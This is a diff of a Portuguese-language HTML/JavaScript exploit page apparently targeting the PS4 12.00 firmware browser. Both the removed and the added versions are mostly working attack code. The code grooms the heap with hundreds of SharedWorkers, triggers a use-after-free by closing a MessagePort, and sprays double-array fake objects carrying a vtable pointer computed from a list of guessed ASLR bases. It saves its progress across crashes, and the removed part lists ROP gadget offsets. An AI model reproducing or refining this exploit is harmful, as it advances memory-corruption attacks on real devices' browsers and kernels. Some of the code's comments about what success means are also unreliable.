@@ -2,231 +2,181 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 LEAK HUNTER (MONOLITH)</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PS4 12.00 AUTO BASE HUNTER</title>
     
 </head>
 <body>
 
-    <h1>PS4 12.00 - SINGLE FILE EXPLOIT</h1>
-    <h3>Alvo: SharedWorker (0xA0) | Método: Lapse Spray</h3>
+    <h1>PS4 12.00 - AUTO BASE HUNTER</h1>
+    <h3>VTable Offset: 0x3837CC8 | Target: 0xA0</h3>
+    <h2 id="status_text">Inicializando...</h2>
+    
+    <button id="btn_action" onclick="start_sequence()">INICIAR BUSCA</button>
+    <button onclick="reset_progress()" style="background:#550000; border-color:red;">RESETAR</button>
 
-    <div class="controls">
-        <button onclick="start_exploit()">INICIAR TESTE</button>
-    </div>
-
-    <div id="log">Sistema pronto. Clique para iniciar.</div>
+    <div id="log"></div>
 
     <script>
-        // =================================================================
-        // 1. CONFIGURAÇÕES & GADGETS
-        // =================================================================
-        const CONFIG = {
-            WORKER_LIMIT: 405,        // Zona de segurança antes do crash
-            SPRAY_QUANTITY: 20000,    // Quantidade massiva para garantir cobertura
-            TARGET_SIZE: 0xA0         // 160 bytes (Do binário)
-        };
-
-        const GADGETS = {
-            pop_rdi: 0x2FEB5,
-            sys_mmap: 0x7500,
-            jmp_rsi: 0x47b31,
-            kl_lock: 0xE6C20
-        };
-
-        // =================================================================
-        // 2. UTILITÁRIOS
-        // =================================================================
-        function log(msg, type = "info") {
-            const d = document.getElementById("log");
-            if (!d) return;
-
-            let color = "#8b949e";
-            if (type === "success") color = "#55ff55";
-            if (type === "fail") color = "#ff5555";
-            if (type === "warn") color = "#ffff55";
-            if (type === "leak") color = "#d455ff";
-
-            const entry = document.createElement("div");
-            entry.style.color = color;
-            entry.style.borderBottom = "1px solid #222";
-            entry.style.padding = "2px";
-            
-            const time = new Date().toLocaleTimeString();
-            entry.innerHTML = `[${time}] ${msg}`;
-            
-            d.appendChild(entry);
+        function log(msg, color="#ccc") {
+            var d = document.getElementById("log");
+            d.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
             d.scrollTop = d.scrollHeight;
         }
 
         // =================================================================
-        // 3. GERENCIAMENTO DE MEMÓRIA (HEAP)
+        // 1. CONFIGURAÇÃO E DADOS REAIS
         // =================================================================
-        var grooming_stash = [];
+        const VTABLE_OFFSET = 0x3837CC8n; // Offset fixo do arquivo ELF
+        const TARGET_SIZE   = 0xA0;       // Tamanho fixo do SharedWorker
 
-        function prepare_heap(size) {
-            log(`HEAP: Criando buracos de 0x${size.toString(16)}...`, "info");
-            grooming_stash = [];
+        // Lista de Bases para testar (ASLR do FreeBSD/PS4 não é infinito)
+        const BASES = [
+            0x800000000n, 0x820000000n, 0x801000000n, 
+            0x804000000n, 0x808000000n, 0x880000000n,
+            0x900000000n, 0x920000000n, 0x200000000n,
+            0x800004000n, 0x820004000n
+        ];
+
+        var current_idx = 0;
+
+        // =================================================================
+        // 2. LÓGICA DE PERSISTÊNCIA (Para sobreviver ao Crash)
+        // =================================================================
+        function init() {
+            var saved = localStorage.getItem("base_idx");
+            if(saved) current_idx = parseInt(saved);
             
-            // Precisamos criar arrays que ocupem exatamente 'size' bytes.
-            // Um Double Array tem overhead de header. 
-            // Para 160 bytes (0xA0), precisamos calcular: 160 - 16 (header) = 144 bytes de dados.
-            // 144 / 8 bytes por double = 18 elementos.
-            
-            // Vamos usar a heurística do Lapse: Arrays de Doubles.
-            const elementCount = Math.floor((size - 16) / 8); 
-            
-            let temp = [];
-            // Aloca 3000 buffers
-            for (let i = 0; i < 3000; i++) {
-                let arr = new Array(elementCount);
-                arr.fill(1.1); // Preenche com doubles
-                temp.push(arr);
+            if (current_idx >= BASES.length) {
+                document.getElementById("status_text").innerText = "TODAS AS BASES FALHARAM.";
+                log("Ciclo completo. Tente reiniciar o console e limpar dados.", "red");
+                return;
             }
 
-            // Libera alternado (Checkerboard)
-            // [Ocupado] [Livre] [Ocupado] [Livre]
-            let holes = 0;
-            for (let i = 0; i < temp.length; i += 2) {
-                temp[i] = null; // Libera para o GC
-                holes++;
-            }
+            var current_base = BASES[current_idx];
+            document.getElementById("status_text").innerText = `Base Atual: 0x${current_base.toString(16)}`;
+            log(`Preparado para testar Base #${current_idx + 1}: 0x${current_base.toString(16)}`);
             
-            grooming_stash = temp.filter(x => x !== null);
-            log(`HEAP: ${holes} buracos preparados no Butterfly Heap.`, "success");
+            // Auto-run opcional (Descomente para loop automático após crash)
+            // setTimeout(start_sequence, 2000);
         }
 
-        function clear_heap() {
-            grooming_stash = [];
+        function reset_progress() {
+            localStorage.setItem("base_idx", 0);
+            location.reload();
+        }
+
+        function save_next() {
+            localStorage.setItem("base_idx", current_idx + 1);
         }
 
         // =================================================================
-        // 4. PAYLOAD (DOUBLE ARRAY)
+        // 3. PAYLOAD: FAKE OBJECT COM VTABLE CALCULADA
         // =================================================================
-        function build_payload(size) {
-            const elementCount = Math.floor((size - 16) / 8);
-            const arr = new Array(elementCount);
+        function build_payload(base_addr) {
+            // Calcula o endereço real da VTable na memória
+            // Se a Base estiver certa, VTable = Base + Offset
+            var vtable_real = base_addr + VTABLE_OFFSET;
             
-            // Valor Marcador: 1.1 (0x3FF199999999999A)
-            // Se o kernel ler isso como ponteiro, é um endereço de Userland seguro.
-            // Se o JS ler isso de volta num objeto corrompido, saberemos.
+            // Double Array Spray (Butterfly)
+            // Tamanho 0xA0 (160) - 16 (Header) = 144 bytes dados
+            // 144 / 8 = 18 elementos
+            var arr = new Array(18);
+            
+            // Converte o endereço (BigInt) para Float
+            var buf = new ArrayBuffer(8);
+            var view = new DataView(buf);
+            view.setBigUint64(0, vtable_real, true);
+            var vtable_float = view.getFloat64(0, true);
+
+            // Enche o objeto com esse ponteiro válido
             for(let i=0; i<arr.length; i++) {
-                arr[i] = 1.1; 
+                arr[i] = vtable_float;
             }
-            
             return arr;
         }
 
         // =================================================================
-        // 5. LÓGICA PRINCIPAL (EXPLOIT)
+        // 4. EXECUÇÃO
         // =================================================================
-        var workers_stash = [];
-        var is_running = false;
-        var interval_ref = null;
+        var workers = [];
 
-        async function start_exploit() {
-            if (is_running) return;
-            if (!window.SharedWorker) return log("ERRO: Navegador incompatível.", "fail");
+        async function start_sequence() {
+            if(!window.SharedWorker) return log("Navegador incompatível.");
             
-            is_running = true;
-            const size = CONFIG.TARGET_SIZE;
+            // Salva o próximo índice ANTES de rodar.
+            // Se der crash, quando voltar, já tenta o próximo.
+            save_next();
             
-            log(`>>> INICIANDO (Tamanho 0x${size.toString(16)}) <<<`, "warn");
+            var base = BASES[current_idx];
+            var payload = build_payload(base);
+            
+            log(`Construindo Fake Object com VTable: 0x${(base + VTABLE_OFFSET).toString(16)}`);
 
-            // 1. Preparar Memória
-            prepare_heap(size);
-            
-            // 2. Payload
-            const payload = build_payload(size);
-
-            // 3. Grooming de Workers (Encher até a borda segura)
-            log("Grooming de Workers (380)...");
-            workers_stash = [];
+            // Grooming (380)
             for(let i=0; i<380; i++) {
-                try { workers_stash.push(new SharedWorker("data:text/javascript,1", "g"+i)); } catch(e){}
+                try { workers.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
             }
 
-            // 4. Trigger Loop (Zona de Pressão)
-            let p_count = 0;
-            const limit = CONFIG.WORKER_LIMIT - 380;
-
-            interval_ref = setInterval(() => {
+            // Trigger (403)
+            var p_count = 0;
+            var limit = 403 - 380;
+            
+            var it = setInterval(() => {
                 if (p_count >= limit) {
-                    clearInterval(interval_ref);
+                    clearInterval(it);
                     
-                    // O MOMENTO DA VERDADE (Worker 403)
-                    const victim = workers_stash.pop();
+                    log("!!! DISPARANDO NO WORKER 403 !!!", "orange");
                     
-                    attempt_leak(victim, payload);
+                    var v = workers.pop();
+                    var p = v.port;
                     
-                    is_running = false;
+                    // FREE
+                    v.port.close();
+                    
+                    // SPRAY
+                    var spray = [];
+                    for(let k=0; k<25000; k++) {
+                        spray.push(payload.slice(0)); // Clone rápido
+                    }
+
+                    // CHECK DE VIDA
+                    setTimeout(() => {
+                        try {
+                            // Se a base estiver CERTA: O objeto é válido. .toString() funciona.
+                            // Se a base estiver ERRADA: Ponteiro inválido. Crash/Panic.
+                            
+                            var s = p.toString();
+                            
+                            // Se chegamos aqui, o console NÃO desligou!
+                            log("!!! SUCESSO: CONSOLE SOBREVIVEU !!!", "#00ff00");
+                            log(`A Base correta é: 0x${base.toString(16)}`, "#00ff00");
+                            
+                            // REVERTER SALVAMENTO (Achamos a certa!)
+                            localStorage.setItem("base_idx", current_idx); 
+                            alert(`BASE ENCONTRADA: 0x${base.toString(16)}\nUse este valor no config.js!`);
+                            
+                        } catch(e) {
+                            log("Erro JS (Isso é bom, não crashou o kernel): " + e);
+                        }
+                        
+                        // Se não crashou, mas também não funcionou, tenta limpar
+                        workers.forEach(w=>{try{w.port.close()}catch(e){}});
+                    }, 500);
+                    
                     return;
                 }
-
+                
                 try {
-                    let w = new SharedWorker("data:text/javascript,1", "v_"+p_count);
+                    let w = new SharedWorker("data:text,1", "v"+p_count);
                     w.port.start();
-                    workers_stash.push(w);
-                    
-                    if(p_count % 5 == 0) log(`Pressão: ${381+p_count}`);
-                } catch(e) {
-                    log("Erro crítico de alocação: " + e, "fail");
-                }
-                
+                    workers.push(w);
+                } catch(e){}
                 p_count++;
-            }, 60); // 60ms entre alocações
+            }, 60);
         }
 
-        function attempt_leak(victim, payload) {
-            log("!!! DISPARANDO UAF (0xA0) !!!", "warn");
-            
-            const port = victim.port;
-            
-            // 1. FREE
-            victim.port.close();
-            
-            // 2. SPRAY (Imediato)
-            // Usamos slice() para clonar o array rapidamente e inundar o heap
-            const spray = [];
-            for (let k = 0; k < CONFIG.SPRAY_QUANTITY; k++) {
-                spray.push(payload.slice(0));
-            }
-
-            // 3. VERIFICAÇÃO
-            setTimeout(() => {
-                try {
-                    const s = port.toString();
-                    
-                    // Se o objeto foi sobrescrito, ele não deve ser mais [object MessagePort]
-                    if (s.indexOf("MessagePort") === -1) {
-                        log("!!! SUCESSO ABSOLUTO !!!", "leak");
-                        log("Objeto Corrompido: " + s, "leak");
-                        document.body.style.backgroundColor = "#004400";
-                        alert("LEAK ENCONTRADO! Tamanho 0xA0 confirmado.");
-                    } else {
-                        log("Falha: Objeto intacto [object MessagePort].");
-                        
-                        // Teste de estresse final: Tentar acessar propriedade
-                        // Se o vtable estiver sujo com 1.1, isso deve causar um crash controlado
-                        try { let temp = port.onmessage; } catch(e) {
-                            if(e.toString().match(/0x/)) {
-                                log("LEAK NO ERRO: " + e, "leak");
-                                alert("LEAK NO ERRO!");
-                            }
-                        }
-                    }
-                } catch (e) {
-                    log("ERRO CAPTURADO (BOM SINAL): " + e, "leak");
-                }
-                
-                // Limpeza
-                workers_stash.forEach(w => { try{w.port.close()}catch(e){} });
-                clear_heap();
-                
-            }, 500);
-        }
-
+        // Iniciar UI
+        init();
     </script>
 </body>
 </html>
-
